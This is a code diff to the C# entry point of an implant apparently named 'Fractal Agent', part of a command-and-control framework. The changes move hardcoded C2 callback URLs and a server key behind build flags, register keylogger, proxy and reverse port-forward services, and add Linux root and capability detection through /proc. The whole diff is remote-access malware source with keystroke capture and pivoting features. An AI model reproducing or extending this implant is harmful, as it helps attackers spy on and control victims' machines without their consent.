@@ -49,18 +49,23 @@ namespace EntryPoint
             string serverKey = Agent.Properties.Resources.Key;
             string implantId = Agent.Properties.Resources.Implant;
 #if DEBUG
-            Debug.Listeners.Add(new TextWriterTraceListener(Console.Out));
+            Trace.Listeners.Add(new TextWriterTraceListener(Console.Out));
+#endif
 
+#if LOCAL
+            connUrl = "http://127.0.0.1:2000";
+            serverKey = "MXlPZEVWWGVmN2xqbnpyUg==";
+            implantId = GenerateName();
             //connUrl = "https://192.168.48.134:443";
             //connUrl = "http://192.168.48.134:2000";
             //connUrl = "pipe://127.0.0.1:Fractal";
-            //
-            //connUrl = "http://127.0.0.1:2000";
             //connUrl = "tcp://*:4444";
-
             //connUrl = "https://127.0.0.1:3000";
+#endif
 
 
+
+#if DEBUG
             if (_args.Count() > 0)
             {
                 connUrl = _args[0];
@@ -70,19 +75,14 @@ namespace EntryPoint
             {
                 serverKey = _args[1];
             }
-            //else
-            //{
-            //    serverKey = "MXlPZEVWWGVmN2xqbnpyUg==";
-            //}
-
-
-
 #endif
             var connexion = ConnexionUrl.FromString(connUrl);
 
+#if DEBUG
             Debug.WriteLine($"Endpoint is {connUrl}.");
             Debug.WriteLine($"ServerKey is {serverKey}.");
             Debug.WriteLine($"Implant is {implantId}.");
+#endif
 
             if (!connexion.IsValid)
             {
@@ -109,12 +109,9 @@ namespace EntryPoint
             ServiceProvider.RegisterSingleton<IJobService>(new JobService());
             ServiceProvider.RegisterSingleton<IProxyService>(new ProxyService(frameService));
             ServiceProvider.RegisterSingleton<IReversePortForwardService>(new ReversePortForwardService(frameService));
-
+#if WINDOWS
             ServiceProvider.RegisterSingleton<IKeyLogService>(new KeyLogService());
-
-            //ServiceProvider.RegisterSingleton<IPivotService>(new PivotService());
-
-
+#endif
 
             var commModule = CommunicationFactory.CreateCommunicator(connexion);
 
@@ -126,18 +123,24 @@ namespace EntryPoint
                 var agent = new Agent.Agent(metaData, commModule);
 
 #if DEBUG
-            Debug.WriteLine($"AgentId is {metaData.Id}");
+                Debug.WriteLine($"AgentId is {metaData.Id}.");
 #endif
 
 
                 var s_agentThread = new Thread(agent.Run);
                 s_agentThread.Start();
+#if DEBUG
+                Debug.WriteLine($"AgentId is started");
+#endif
                 s_agentThread.Join();
+#if DEBUG
+                Debug.WriteLine($"AgentId Thread Ended");
+#endif
             }
-            catch(Exception ex)
+            catch (Exception ex)
             {
 #if DEBUG
-            Debug.WriteLine($"AgentId is {metaData.Id}");
+            Debug.WriteLine($"AgentId is {ex}");
 #endif
             }
 
@@ -155,11 +158,10 @@ namespace EntryPoint
             var hostname = Dns.GetHostName();
             var addresses = Dns.GetHostAddressesAsync(hostname).Result;
 
-           
-
             var process = Process.GetCurrentProcess();
             var userName = Environment.UserName;
 
+#if WINDOWS
             var integrity = IntegrityLevel.Medium;
             if (userName == "SYSTEM")
                 integrity = IntegrityLevel.System;
@@ -171,6 +173,32 @@ namespace EntryPoint
                     integrity = IntegrityLevel.High;
                 }
             }
+#else
+            var integrity = IntegrityLevel.Medium;
+
+            if (Environment.UserName == "root")
+            {
+                integrity = IntegrityLevel.System;
+            }
+            else
+            {
+                // Check capabilities via /proc (approximatif)
+                var caps = System.IO.File.Exists("/proc/self/status")
+                    ? System.IO.File.ReadAllText("/proc/self/status")
+                    : string.Empty;
+
+                if (caps.Contains("CapEff:") && !caps.Contains("CapEff:\t0000000000000000"))
+                {
+                    integrity = IntegrityLevel.High;
+                }
+            }
+#endif
+
+#if WINDOWS
+            var osType = OsType.Windows;
+#else
+            var osType = OsType.Linux;
+#endif
 
 
             ////////For Topological testing only
@@ -197,15 +225,15 @@ namespace EntryPoint
                     Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                     Integrity = integrity,
                     EndPoint = endpoint,
-                    Version = "Fractal Agent .Net" + " " + Assembly.GetExecutingAssembly().GetName().Version.ToString(),
+                    Version = "Fractal Agent .Net" + " (" + osType + ") " + Assembly.GetExecutingAssembly().GetName().Version.ToString(),
                     SleepInterval = endpoint.ToLower().StartsWith("http") ? 2 : 0, //pivoting agent
                     SleepJitter = 0
                 };
 
             return metadata;
         }
-
-        /*public static string GenerateName()
+#if LOCAL
+        public static string GenerateName()
         {
             var animals = new List<string>
 {
@@ -243,6 +271,7 @@ namespace EntryPoint
             string result = $"{quality}-{animal}";
 
             return result;
-        }*/
+        }
+#endif
     }
 }
